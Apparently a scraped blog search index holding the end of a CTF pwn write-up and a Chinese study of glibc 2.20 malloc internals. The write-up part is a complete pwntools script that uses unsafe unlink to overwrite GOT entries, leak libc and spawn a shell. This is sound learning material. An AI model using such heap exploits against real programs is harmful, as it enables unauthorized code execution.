ELF(binary,checksec=False) #libc = ELF('./libc-2.271.so') def add(size): sh.sendline('1') sh.sendline(str(size)) def edit(index,size,content): sh.sendline('2') sh.sendline(str(index)) sh.sendline(str(size)) sh.sendline(str(content)) def free(index): sh.sendline('3') sh.sendline(str(index)) heap_array = 0x602150 strlen_got = elf.got['strlen'] puts_plt = elf.plt['puts'] free_got=elf.got['free'] add(0x10) add(0x80) #2 sh.recvuntil('OK') add(0x80) #3 sh.recvuntil('OK') add(0x10) #4 sh.recvuntil('OK') edit(4,0x8,'/bin/sh\\x00') payload = p64(0)+p64(0x81)+p64(heap_array-0x18)+p64(heap_array-0x10) payload=payload.ljust(0x80,'\\x00') payload+=p64(0x80)+p64(0x90) edit(2,0x90,payload) sh.recvuntil('OK') #gdb.attach(sh) free(3) sh.recvuntil('OK') payload=p64(0)+p64(strlen_got)+p64(free_got) edit(2,0x18,payload) sh.recvuntil('OK') payload=p64(puts_plt) edit(0,0x8,payload) sh.recvuntil('OK') sh.sendline('4') sh.sendline('1') free_addr = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) libc = LibcSearcher('free',free_addr) libcbase = free_addr-libc.dump('free') leak('libc base',libcbase) system = libcbase+libc.dump('system') edit(1,0x8,p64(system)) free(4) sh.interactive() ","date":"2021-04-18","objectID":"/challenges-100-week-7/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 7","uri":"/challenges-100-week-7/#exp-6"},{"categories":["Pwning"],"content":"Glibc-2.20-malloc源码分析第一次看源码，都算不上分析只是写写自己的理解。不知如何入手，所以记录的内容难免凌乱缺少条理，还请见谅。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:0:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#glibc-220-malloc源码分析"},{"categories":["Pwning"],"content":"大小和对齐检查以及转换","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#大小和对齐检查以及转换"},{"categories":["Pwning"],"content":"struct malloc_chunk struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;}; 我省去了大部分的描述，只保留了结构图。 /* malloc_chunk details: An allocated chunk looks like this: chunk-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if allocated | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |M|P| mem-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . . |nextchunk-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Free chunks are stored in circular doubly-linked lists, and look like this: chunk-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:' | Size of chunk, in bytes |P| mem-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . . |nextchunk-\u003e +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+*/ prev_size：如果前一个chunk是空闲的，该域表示前一个chunk的大小，如果前一个chunk不空闲，该域无意义。注意：这里的前一个指的是存储物理相邻地址较低的那一个chunk。 size：该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示： A: NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程（分配区/arena），1表示不属于，0表示属于。 M: IS_MAPPED，他表示当前chunk是从哪个内存区域获得的虚拟内存。M为1表示该chunk是从mmap映射区域分配的，否则是从heap区域分配的。 P: PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的P位都会被设置为1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并。 fd，bk： chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下 fd 指向下一个（非物理相邻）空闲的 chunk bk 指向上一个（非物理相邻）空闲的 chunk fd_nextsize， bk_nextsize：也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。 fd_nextsize指向下一个比当前chunk size小的第一个空闲chunk，不包含 bin 的头指针。 bk_nextszie指向上一个比当前chunk size大的第一个空闲chunk，不包含 bin 的头指针。 large bins中的空闲chunk是按照大小排序的。这样做可以避免在寻找合适chunk 时挨个遍历。 注意：fd所指向的是从表头到表尾方向，bk则是反过来。这样理解下一个和上一个的含义。 一个已经分配的 chunk 的样子如下。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。 当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前chunk使用。这就是chunk中的空间复用。 #define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) /* The smallest size we can malloc is an aligned minimal chunk */ #define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \u0026 ~MALLOC_ALIGN_MASK)) /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long)(m) \u0026 MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \\ \u0026 MALLOC_ALIGN_MASK) 每次malloc得到的是mem指针，真正指向整个chunk的是chunk指针，可以通过上面两个宏进行转换。 MIN_CHUNK_SIZE 定义了最小chunk的至少要包含fd与bk指针。 MINSIZE定义了最小的分配的内存大小，是对MIN_CHUNK_SIZE进行了2*SIZE_SZ对齐，地址对齐后与MIN_CHUNK_SIZE的大小仍然是一样的。 宏aligned_OK和misaligned_chunk(p)用于校验地址是否是按2*SIZE_SZ对齐的。 /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made l","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#struct-malloc_chunk"},{"categories":["Pwning"],"content":"物理chunk操作 /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */#define PREV_INUSE 0x1/* extract inuse bit of previous chunk */#define prev_inuse(p) ((p)-\u003esize \u0026 PREV_INUSE)/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */#define IS_MMAPPED 0x2/* check for mmap()'ed chunk */#define chunk_is_mmapped(p) ((p)-\u003esize \u0026 IS_MMAPPED)/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */#define NON_MAIN_ARENA 0x4/* check for chunk from non-main arena */#define chunk_non_main_arena(p) ((p)-\u003esize \u0026 NON_MAIN_ARENA) 参考上一节 /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)/* Get size, ignoring use bits */#define chunksize(p) ((p)-\u003esize \u0026 ~(SIZE_BITS))/* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-\u003esize \u0026 ~SIZE_BITS)))/* Ptr to previous physical malloc_chunk */#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - ((p)-\u003eprev_size)))/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s))) 如果前一个邻接chunk块空闲，那么当前chunk块结构体内的prev_size字段记录的是前一个邻接chunk块的大小。这就是由当前chunk指针获得前一个空闲chunk地址的依据。 如果前一个邻接chunk在使用中，则当前chunk的prev_size的空间被前一个chunk借用中，其中的值是前一个chunk的内存内容，对当前chunk没有任何意义。 字段size记录了本chunk的大小，无论下一个chunk是空闲状态或是被使用状态，都可以通过本chunk的地址加上本chunk的大小，得到下一个chunk的地址，由于size的低3个bit记录了控制信息，需要屏蔽掉这些控制信息，取出实际的size在进行计算下一个chunk地址，这是next_chunk(p)的实现原理。prev_chunk同理。 宏chunksize(p)用于获得chunk的实际大小，需要屏蔽掉size中的控制信息。 宏chunk_at_offset(p, s)将p+s的地址强制看作一个chunk。 /* extract p's inuse bit */#define inuse(p) \\ ((((mchunkptr) (((char *) (p)) + ((p)-\u003esize \u0026 ~SIZE_BITS)))-\u003esize) \u0026 PREV_INUSE)/* set/clear chunk as being inuse without otherwise disturbing */#define set_inuse(p) \\ ((mchunkptr) (((char *) (p)) + ((p)-\u003esize \u0026 ~SIZE_BITS)))-\u003esize |= PREV_INUSE#define clear_inuse(p) \\ ((mchunkptr) (((char *) (p)) + ((p)-\u003esize \u0026 ~SIZE_BITS)))-\u003esize \u0026= ~(PREV_INUSE)/* check/set/clear inuse bits in known places */#define inuse_bit_at_offset(p, s) \\ (((mchunkptr) (((char *) (p)) + (s)))-\u003esize \u0026 PREV_INUSE)#define set_inuse_bit_at_offset(p, s) \\ (((mchunkptr) (((char *) (p)) + (s)))-\u003esize |= PREV_INUSE)#define clear_inuse_bit_at_offset(p, s) \\ (((mchunkptr) (((char *) (p)) + (s)))-\u003esize \u0026= ~(PREV_INUSE))/* Set size at head, without disturbing its use bit */#define set_head_size(p, s) ((p)-\u003esize = (((p)-\u003esize \u0026 SIZE_BITS) | (s)))/* Set size/use field */#define set_head(p, s) ((p)-\u003esize = (s))/* Set size at footer (only when chunk is not in use) */#define set_foot(p, s) (((mchunkptr) ((char *) (p) + (s)))-\u003eprev_size = (s)) chunk头的检查与设置操作。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#物理chunk操作"},{"categories":["Pwning"],"content":"内部数据结构 /* Bins An array of bin headers for free chunks. Each bin is doubly linked. The bins are approximately proportionally (log) spaced. There are a lot of these bins (128). This may look excessive, but works very well in practice. Most bins hold sizes that are unusual as malloc request sizes, but are more usual for fragments and consolidated sets of chunks, which is what these bins hold, so they can be found quickly. All procedures maintain the invariant that no consolidated chunk physically borders another one, so each chunk in a list is known to be preceeded and followed by either inuse chunks or the ends of memory. Chunks in bins are kept in size order, with ties going to the approximately least recently used chunk. Ordering isn't needed for the small bins, which all contain the same-sized chunks, but facilitates best-fit allocation for larger chunks. These lists are just sequential. Keeping them in order almost never requires enough traversal to warrant using fancier ordered data structures. Chunks of the same size are linked with the most recently freed at the front, and allocations are taken from the back. This results in LRU (FIFO) allocation order, which tends to give each chunk an equal opportunity to be consolidated with adjacent freed chunks, resulting in larger free chunks and less fragmentation. To simplify use in double-linked lists, each bin header acts as a malloc_chunk. This avoids special-casing for headers. But to conserve space and improve locality, we allocate only the fd/bk pointers of bins, and then use repositioning tricks to treat these as the fields of a malloc_chunk*. */ 对于空闲块的管理ptmalloc使用了bins，根据size的大小将其放入不同类型的bin中，每种bin内部又分为不同的bin对空闲块进行更细化的管理。每个bin都是由双向链表进行组织维护，并且每个bin的头部都充当一个malloc_chunk结构体，在bins数组中只为每个bin预留了两个指针的内存空间用于存放bin的链表头的fb和bk指针。。 除了small bin外其余bin中的chunk都以大小顺序排列。 typedef struct malloc_chunk *mbinptr;/* addressing -- note that bin_at(0) does not exist */#define bin_at(m, i) \\ (mbinptr) (((char *) \u0026((m)-\u003ebins[((i) - 1) * 2])) \\ - offsetof (struct malloc_chunk, fd))/* analog of ++bin */#define next_bin(b) ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) \u003c\u003c 1)))/* Reminders about list directionality within bins */#define first(b) ((b)-\u003efd)#define last(b) ((b)-\u003ebk) bin_at(m,i)用来通过index来获取bin的链表头，m 指的是分配区，i 是索引。 宏next_bin(b)用于获得下一个bin的地址，根据前面的分析，我们知道只需要将当前bin的地址向后移动两个指针的长度就得到下一个bin的链表头地址。 bin采用双向链表，表头的fd指向的第一个可用chunk，bk指向链表中最后一个。first(b)和last(b)用来获取一个bin中第一和最后一个可用chunk。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#内部数据结构"},{"categories":["Pwning"],"content":"unlink /* Take a chunk off a bin list */#define unlink(P, BK, FD) { \\ FD = P-\u003efd; \\ BK = P-\u003ebk; \\ if (__builtin_expect (FD-\u003ebk != P || BK-\u003efd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P); \\ else { \\ FD-\u003ebk = BK; \\ BK-\u003efd = FD; \\ if (!in_smallbin_range (P-\u003esize) \\ \u0026\u0026 __builtin_expect (P-\u003efd_nextsize != NULL, 0)) { \\ assert (P-\u003efd_nextsize-\u003ebk_nextsize == P); \\ assert (P-\u003ebk_nextsize-\u003efd_nextsize == P); \\ if (FD-\u003efd_nextsize == NULL) { \\ if (P-\u003efd_nextsize == P) \\ FD-\u003efd_nextsize = FD-\u003ebk_nextsize = FD; \\ else { \\ FD-\u003efd_nextsize = P-\u003efd_nextsize; \\ FD-\u003ebk_nextsize = P-\u003ebk_nextsize; \\ P-\u003efd_nextsize-\u003ebk_nextsize = FD; \\ P-\u003ebk_nextsize-\u003efd_nextsize = FD; \\ } \\ } else { \\ P-\u003efd_nextsize-\u003ebk_nextsize = P-\u003ebk_nextsize; \\ P-\u003ebk_nextsize-\u003efd_nextsize = P-\u003efd_nextsize; \\ } \\ } \\ } \\} 经典unlink用来从链表中取出一个chunk。 注意：large bins中的空闲chunk可能处于两个双向循环链表中，unlink时需要从两个链表中都删除。 所以，从这里可以看出在large bin中chunk是用fd_nextsize和bk_nextsize来链接的。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:1","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#unlink"},{"categories":["Pwning"],"content":"large bin\u0026small bin /* Indexing Bins for sizes \u003c 512 bytes contain chunks of all the same size, spaced 8 bytes apart. Larger bins are approximately logarithmically spaced: 64 bins of size 8 32 bins of size 64 16 bins of size 512 8 bins of size 4096 4 bins of size 32768 2 bins of size 262144 1 bin of size what's left There is actually a little bit of slop in the numbers in bin_index for the sake of speed. This makes no difference elsewhere. The bins top out around 1MB because we expect to service large requests via mmap. Bin 0 does not exist. Bin 1 is the unordered list; if that would be a valid chunk size the small bins are bumped up one. */ sizes小于512 bytes的chunk属于small bin的管理范围，表中列出了bin之间的公差，单位byte。bin 0不存在，bin 1是unsorted bin的链表头。 #define NBINS 128#define NSMALLBINS 64#define SMALLBIN_WIDTH MALLOC_ALIGNMENT#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT \u003e 2 * SIZE_SZ)#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)#define in_smallbin_range(sz) \\ ((unsigned long) (sz) \u003c (unsigned long) MIN_LARGE_SIZE)#define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) \u003e\u003e 4) : (((unsigned) (sz)) \u003e\u003e 3))\\ + SMALLBIN_CORRECTION)#define largebin_index_32(sz) \\ (((((unsigned long) (sz)) \u003e\u003e 6) \u003c= 38) ? 56 + (((unsigned long) (sz)) \u003e\u003e 6) :\\ ((((unsigned long) (sz)) \u003e\u003e 9) \u003c= 20) ? 91 + (((unsigned long) (sz)) \u003e\u003e 9) :\\ ((((unsigned long) (sz)) \u003e\u003e 12) \u003c= 10) ? 110 + (((unsigned long) (sz)) \u003e\u003e 12) :\\ ((((unsigned long) (sz)) \u003e\u003e 15) \u003c= 4) ? 119 + (((unsigned long) (sz)) \u003e\u003e 15) :\\ ((((unsigned long) (sz)) \u003e\u003e 18) \u003c= 2) ? 124 + (((unsigned long) (sz)) \u003e\u003e 18) :\\ 126)#define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) \u003e\u003e 6) \u003c= 45) ? 49 + (((unsigned long) (sz)) \u003e\u003e 6) :\\ ((((unsigned long) (sz)) \u003e\u003e 9) \u003c= 20) ? 91 + (((unsigned long) (sz)) \u003e\u003e 9) :\\ ((((unsigned long) (sz)) \u003e\u003e 12) \u003c= 10) ? 110 + (((unsigned long) (sz)) \u003e\u003e 12) :\\ ((((unsigned long) (sz)) \u003e\u003e 15) \u003c= 4) ? 119 + (((unsigned long) (sz)) \u003e\u003e 15) :\\ ((((unsigned long) (sz)) \u003e\u003e 18) \u003c= 2) ? 124 + (((unsigned long) (sz)) \u003e\u003e 18) :\\ 126)// XXX It remains to be seen whether it is good to keep the widths of// XXX the buckets the same or whether it should be scaled by a factor// XXX of two as well.#define largebin_index_64(sz) \\ (((((unsigned long) (sz)) \u003e\u003e 6) \u003c= 48) ? 48 + (((unsigned long) (sz)) \u003e\u003e 6) :\\ ((((unsigned long) (sz)) \u003e\u003e 9) \u003c= 20) ? 91 + (((unsigned long) (sz)) \u003e\u003e 9) :\\ ((((unsigned long) (sz)) \u003e\u003e 12) \u003c= 10) ? 110 + (((unsigned long) (sz)) \u003e\u003e 12) :\\ ((((unsigned long) (sz)) \u003e\u003e 15) \u003c= 4) ? 119 + (((unsigned long) (sz)) \u003e\u003e 15) :\\ ((((unsigned long) (sz)) \u003e\u003e 18) \u003c= 2) ? 124 + (((unsigned long) (sz)) \u003e\u003e 18) :\\ 126)#define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64 (sz) \\ : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz) \\ : largebin_index_32 (sz))#define bin_index(sz) \\ ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz)) 所有的bin头可视为一个数组，总共有128bin，但是实际上因为bin 0和bin 127不存在，所以只有126个bin，bin 1为unsorted bin，bin 2-63为small bin，其余都是large bin。所以small bin为62个，large bin为63个。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:2","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#large-binsmall-bin"},{"categories":["Pwning"],"content":"unsorted bin /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. *//* The otherwise unindexable 1-bin is used to hold unsorted chunks. */#define unsorted_chunks(M) (bin_at (M, 1)) bin 1为unsorted bin的链表头，chunk分割后剩余的部分会首先被放入unsorted bin，并且不排序。若unsorted bin中的chunk不能满足用户的请求，那么就会将其中的chunk进行合并，然后分配到各自属于的bin中。所以unsorted bin扮演一个队列的角色。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:3","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#unsorted-bin"},{"categories":["Pwning"],"content":"Top /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) *//* Conveniently, the unsorted bin can be used as dummy top on first call */#define initial_top(M) (unsorted_chunks (M)) top chunk是特殊的，它不属于任何bin，当任何bin都无法满足要求时才会对其进行操作。当它很大时会释放回操作系统。根据描述，为了不再添加特殊的代码来检查top chunk，所以将其初始化为一个合法的unsorted bin。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:4","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#top"},{"categories":["Pwning"],"content":"binmap /* Binmap To help compensate for the large number of bins, a one-level index structure is used for bin-by-bin searching. `binmap' is a bitvector recording whether bins are definitely empty so they can be skipped over during during traversals. The bits are NOT always cleared as soon as bins are empty, but instead only when they are noticed to be empty during traversal in malloc. *//* Conservatively use 32 bits per map word, even if on 64bit system */#define BINMAPSHIFT 5#define BITSPERMAP (1U \u003c\u003c BINMAPSHIFT)#define BINMAPSIZE (NBINS / BITSPERMAP)#define idx2block(i) ((i) \u003e\u003e BINMAPSHIFT)#define idx2bit(i) ((1U \u003c\u003c ((i) \u0026 ((1U \u003c\u003c BINMAPSHIFT) - 1))))#define mark_bin(m, i) ((m)-\u003ebinmap[idx2block (i)] |= idx2bit (i))#define unmark_bin(m, i) ((m)-\u003ebinmap[idx2block (i)] \u0026= ~(idx2bit (i)))#define get_binmap(m, i) ((m)-\u003ebinmap[idx2block (i)] \u0026 idx2bit (i)) binmap用来简化判断一个bin是否为空，binmap中的bit位是在malloc时进行设置的。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:5","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#binmap"},{"categories":["Pwning"],"content":"fast bin /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */typedef struct malloc_chunk *mfastbinptr;#define fastbin(ar_ptr, idx) ((ar_ptr)-\u003efastbinsY[idx])/* offset 2 to use otherwise unindexable first 2 bins */#define fastbin_index(sz) \\ ((((unsigned int) (sz)) \u003e\u003e (SIZE_SZ == 8 ? 4 : 3)) - 2) fast bin用来保存最近free的small chunk，对于SIZE_SZ为4B的平台，小于64B的chunk分配请求，对于SIZE_SZ为8B的平台，小于128B的chunk分配请求，会首先在fast bin中进行best fit。 fast bin使用单链表进行维护，即仅使用fd域，其可以视为LIFO的链栈。并且其in_use位不会被置零，保证其中的chunk不会被合并。 /* The maximum fastbin request size we support */#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)#define NFASTBINS (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)/* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) 根据SIZE_SZ的不同大小，定义MAX_FAST_SIZE为80B或是160B，fast bins数组的大小NFASTBINS为10，即fast bins共有十个bin，公差为8B。 FASTBIN_CONSOLIDATION_THRESHOLD为64k，当每次释放的chunk与该chunk相邻的空闲chunk合并后的大小大于64k时，就认为内存碎片可能比较多了，就需要把fast bins中的所有chunk都进行合并，以减少内存碎片对系统的影响。 #ifndef DEFAULT_MXFAST#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)#endif/* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */#define set_max_fast(s) \\ global_max_fast = (((s) == 0) \\ ? SMALLBIN_WIDTH : ((s + SIZE_SZ) \u0026 ~MALLOC_ALIGN_MASK))#define get_max_fast() global_max_fast set_max_fast(s)用来设置默认的fast bins中最大的chunk，在free时，大小小于默认值的chunk都会被加入到fast bins中。 ","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:6","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#fast-bin"},{"categories":["Pwning"],"content":"内部状态表示与初始化","date":"2021-03-07","objectID":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:0","series":null,"tags":["Pwn"],"title":"Glibc 2 20 Malloc源码分析","uri":"/glibc-2-20-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#内部状态表示与初始化"},{"categories":["Pwning"],"content":"malloc_state struct malloc_state{ /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;}; ptmalloc使用malloc_state来管理分配区。mutex用于串行化访问，当有多个线程访问同一个分配区时，第一个获得这个mutex的线程将使用该分配区分配内存，分配完成后，释放该分配区的mutex，以便其它线程使用该分配区。可以理解为锁，当正在使用的线程加锁后，其他线程就无法访问，锁被释放后才可以。 Flags(之前记录在max_fast中)记录了分配区的一些标志： /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. *//* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */#define FASTCHUNKS_BIT (1U)#define have_fastchunks(M) (((M)-\u003eflags \u0026 FASTCHUNKS_BIT) == 0)#define clear_fastchunks(M) catomic_or (\u0026(M)-\u003eflags, FASTCHUNKS_BIT)#define set_fastchunks(M) catomic_and (\u0026(M)-\u003eflags, ~FASTCHUNKS_BIT)/* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. 